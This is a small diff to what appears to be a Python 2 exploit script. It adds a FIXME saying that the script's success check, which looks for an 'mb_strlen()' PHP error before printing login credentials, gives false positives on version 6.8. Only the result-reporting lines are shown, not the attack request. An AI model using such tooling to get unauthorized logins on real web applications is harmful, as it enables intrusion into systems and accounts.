@@ -29,6 +29,7 @@ except urllib2.HTTPError, err:
   print 'HTTP Error:', err.code
 
 if "mb_strlen() expects parameter 1" in content:
+# FIXME: On 6.8 it's showing success, despite it's not.
         print "Success!\nLogin now with user:%s and pass:%s" % (user, password)
 else:
         print "Not success!\n"
